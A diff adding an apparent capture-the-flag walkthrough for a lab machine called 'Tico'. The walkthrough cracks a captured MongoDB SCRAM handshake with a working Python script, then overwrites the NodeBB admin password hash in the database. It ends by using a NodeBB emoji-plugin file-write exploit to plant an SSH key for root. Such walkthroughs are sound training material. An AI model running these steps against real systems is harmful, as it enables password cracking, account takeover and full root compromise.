@@ -3562,3 +3562,288 @@ whoami
 nt authority\system
 ```
 
+
+# Tico
+Exploitation Guide for Tico
+Summary
+
+In this walkthrough, we will exploit the target by obtaining and cracking a MongoDB authentication handshake exchange contained within a PCAP file in an anonymous FTP server. After obtaining the MongoDB admin user's password, we'll be able to exploit a vulnerable NodeBB plugin, allowing us to write arbitrary files to the file system. The NodeBB application is misconfigured to run with the highest privileges, and the exploit will allow us to overwrite the root user's authorized_keys file and SSH in.
+Enumeration
+Nmap
+
+We'll begin with an nmap scan against all TCP ports.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p- 192.168.120.186
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 08:34 EDT
+Nmap scan report for 192.168.120.186
+Host is up (0.033s latency).
+Not shown: 65428 filtered ports, 101 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+8080/tcp  open  http-proxy
+11211/tcp open  memcache
+27017/tcp open  mongod
+
+We see several services listening on the target. Next, we'll perform a more detailed scan against the open ports.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 21,22,80,8080,11211,27017 -sC -sV 192.168.120.186 -T4
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 08:39 EDT
+Nmap scan report for 192.168.120.186
+Host is up (0.033s latency).
+
+PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Feb 01 02:10 pub
+| ftp-syst: 
+|   STAT: 
+...
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+...
+80/tcp    open  http       nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Markdown Editor
+8080/tcp  open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+...
+| http-robots.txt: 3 disallowed entries 
+|_/admin/ /reset/ /compose
+|_http-title: Home | NodeBB
+11211/tcp open  memcached  Memcached 1.5.6 (uptime 1186 seconds; Ubuntu)
+27017/tcp open  mongodb    MongoDB 4.0.22
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+...
+
+We'll note a couple of items from this scan. First, the FTP server allows for anonymous authentication. Second, the version of MongoDB running on the target is 4.0.22.
+Web Enumeration
+
+Navigating to the website on port 8080 (http://192.168.120.186:8080/), we see that a NodeBB forum application is installed on the target.
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s http://192.168.120.186:8080 | html2text 
+
+**** Navigation ****
+
+
+******_NodeBB_******
+    *  Register
+    *  Login
+
+FTP Enumeration
+
+As anonymous FTP is enabled, we'll connect to it and enumerate its contents.
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.120.186      
+Connected to 192.168.120.186.
+220 (vsFTPd 3.0.3)
+Name (192.168.120.186:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (192,168,120,186,156,151).
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Feb 01 02:10 pub
+226 Directory send OK.
+ftp>
+
+Inside the pub directory, we find a PCAP file debug.pcap.
+
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+227 Entering Passive Mode (192,168,120,186,156,162).
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp          4603 Feb 01 02:10 debug.pcap
+226 Directory send OK.
+ftp>
+
+We'll download and examine this file.
+
+ftp> get debug.pcap
+local: debug.pcap remote: debug.pcap
+227 Entering Passive Mode (192,168,120,186,156,75).
+150 Opening BINARY mode data connection for debug.pcap (4603 bytes).
+226 Transfer complete.
+4603 bytes received in 0.00 secs (1.1576 MB/s)
+ftp> bye
+221 Goodbye.
+
+┌──(kali㉿kali)-[~]
+└─$
+
+Exploitation
+MongoDB Authentication Handshake Brute-Force
+
+Opening and viewing the PCAP file in WireShark, we can see that it contains what appears to be a MongoDB authentication handshake.
+
+According to the MongoDB documentation, starting from version 4.0, MongoDB uses Salted Challenge Response Authentication Mechanism (SCRAM) as its default authentication protocol. MongoDB also provides a helpful blog post outlining the protocol. The protocol is also detailed in RFC 5802.
+
+If a full exchange is captured, then an offline dictionary attack can be mounted in an attempt to crack the password. Specifically, we would need to obtain the following information: username, salt, client nonce, server nonce, and the target hash value.
+
+Luckily, it looks like we have the full exchange captured. The username (admin) and the client nonce (+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeK) can be found in the eighth packet.
+
+The server nonce (+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D) and the salt (zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg==) can be found in the ninth packet.
+
+Finally, the target hash (/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98=) can be found in the tenth packet.
+
+Nice, we appear to have all the needed information to mount our dictionary attack. However, unfortunately for us, neither John nor Hashcat support brute-forcing SCRAM, so we'll have to write our own tool. In order to do that, we have to fully understand the protocol.
+
+Because this is an offline attack, we can afford to use a larger wordlist, such as rockyou.txt. The following PoC script should crack the handshake for us within a reasonable time.
+
+#!/usr/bin/python3
+
+import base64
+import hashlib
+import hmac
+import sys
+
+USERNAME = 'admin'
+SALT = 'zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg=='
+CLIENT_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeK'
+SERVER_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D'
+ITERATIONS = 15000
+TARGET = '/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98='
+WORDLIST = '/usr/share/wordlists/rockyou.txt'
+
+def byte_xor(ba1, ba2):
+    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
+
+def proof(username, password, salt, client_nonce, server_nonce, iterations):
+    raw_salt = base64.b64decode(salt)
+    client_first_bare = 'n={},r={}'.format(username, client_nonce)
+    server_first = 'r={},s={},i={}'.format(server_nonce, salt, iterations)
+    client_final_without_proof = 'c=biws,r={}'.format(server_nonce)
+    auth_msg = '{},{},{}'.format(client_first_bare, server_first, client_final_without_proof)
+
+    salted_password = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), raw_salt, iterations)
+    client_key = hmac.digest(salted_password, b'Client Key', 'sha256')
+    stored_key = hashlib.sha256(client_key).digest()
+    client_signature = hmac.new(stored_key, auth_msg.encode('utf-8'), 'sha256').digest()
+    client_proof = byte_xor(client_key, client_signature)
+
+    return base64.b64encode(client_proof).decode('utf-8')
+
+counter = 0
+with open(WORDLIST) as f:
+    for candidate in f:
+        counter = counter + 1
+        if counter % 1000 == 0:
+            print('Tried {} passwords'.format(counter))
+
+        p = proof(USERNAME, candidate.rstrip('\n'), SALT, CLIENT_NONCE, SERVER_NONCE, ITERATIONS)
+        if p == TARGET:
+            print('Password found: {}'.format(candidate.rstrip('\n')))
+            sys.exit(0)
+
+print('Wordlist exhausted with no password found.')
+
+Let's give it a try.
+
+┌──(kali㉿kali)-[~]
+└─$ python3 scram-crack.py
+Tried 1000 passwords
+Tried 2000 passwords
+Tried 3000 passwords
+Tried 4000 passwords
+Password found: monkey13
+
+After about 4000 iterations, our script finds the admin password to be monkey13. Let's connect to MongoDB and list available databases. To do that, we first need to install the mongodb-org-shell package by following this guide. Once the shell package is installed, we'll connect to MongoDB with the recovered credentials.
+
+┌──(kali㉿kali)-[~]
+└─$ mongo mongodb://admin:monkey13@192.168.120.186:27017/
+MongoDB shell version v4.2.13
+connecting to: mongodb://192.168.120.186:27017/?compressors=disabled&gssapiServiceName=mongodb
+Implicit session: session { "id" : UUID("42164b37-99dd-429d-91fc-65cc46e0240a") }
+MongoDB server version: 4.0.22
+...
+---
+
+> show databases
+admin   0.000GB
+config  0.000GB
+local   0.000GB
+nodebb  0.000GB
+>
+
+Recalling that we saw a NodeBB application on port 8080, here we find a database nodebb for it in MongoDB.
+NodeBB Authentication Bypass
+
+Looking up exploits for NodeBB on Exploit-DB leads us to this Arbitrary File Write vulnerability in the NodeBB plugin emoji version 3.2.1. Although we cannot enumerate the plugin version in NodeBB, we'll give this exploit a shot. Unfortunately, this exploit requires authentication, and we don't have the NodeBB admin user's credentials.
+
+However, we have full control of the MongoDB database server. That means that we can overwrite the password for the NodeBB admin user and gain full control of NodeBB. We'll begin by switching to the nodebb database and enumerating available users.
+
+> use nodebb
+switched to db nodebb
+> db.objects.find({ _key: /^user:1$/ })
+{ "_id" : ObjectId("6017626e253f4a61ea72a355"), "_key" : "user:1", "email" : "admin@tico.offsec", "joindate" : 1612145262550, "lastonline" : 1612146689780, "status" : "online", "uid" : 1, "username" : "admin", "userslug" : "admin", "password" : "$2a$12$T3BIimnZgfw60c12wFA99.MbugSdE0hfl/SSCYFZJ7jTVHe5PGGB6", "groupTitle" : "[\"administrators\"]", "topiccount" : 1, "postcount" : 1, "lastposttime" : 1612145263314 }
+
+We see a single record in the collection, which belongs to the default admin user. We need to generate a new salted password hash to replace the password field in the record. We can do that with the htpasswd utility by generating a new bcrypt hash of the password password.
+
+┌──(kali㉿kali)-[~]
+└─$ htpasswd -bnBC 12 "" password            
+:$2y$12$6.8Es6W3Cyc0en31K4inBef3mCoJaDo2lJ6biXdUmKXfrsSqlfgsW
+
+Before using it, however, we first need to strip off the leading :.
+
+┌──(kali㉿kali)-[~]
+└─$ htpasswd -bnBC 12 "" password | tr -d ':'
+$2y$12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu
+
+Next, we'll overwrite the target password field with our newly generated hash.
+
+> db.objects.update({ _key: /^user:1$/ }, { $set: { password: "$2y$12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu" }})
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+> exit
+bye
+
+┌──(kali㉿kali)-[~]
+└─$
+
+We should now be able to authenticate to NodeBB with the credentials admin:password.
+Root SSH File Overwrite
+
+Once we have control of the admin user's account in NodeBB, we can attempt to exploit the NodeBB plugin vulnerability by overwriting the root user's authorized_keys file with our public key. This is exactly what the public exploit is doing.
+
+If we don't already have an SSH key pair, we can create one with ssh-keygen.
+
+┌──(kali㉿kali)-[~]
+└─$ mkdir ~/.ssh
+
+┌──(kali㉿kali)-[~]
+└─$ ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa
+Generating public/private rsa key pair.
+...
+
+First, we'll update the exploit with our target's IP address and port number.
+
+TARGET = 'http://192.168.120.186:8080'
+
+Next, let's run the exploit.
+
+┌──(kali㉿kali)-[~]
+└─$ python3 49813.py    
+[+] Login successful
+[+] Emoji plugin is installed
+[+] Successfully uploaded file
+
+Excellent. The exploit shows that the file was successfully uploaded to the target. To test this, we'll try to SSH as root.
+
+┌──(kali㉿kali)-[~]
+└─$ ssh -i ~/.ssh/id_rsa root@192.168.120.186
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+...
+root@tico:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+The vulnerable NodeBB application was misconfigured to run with the highest privileges, granting us a root shell.
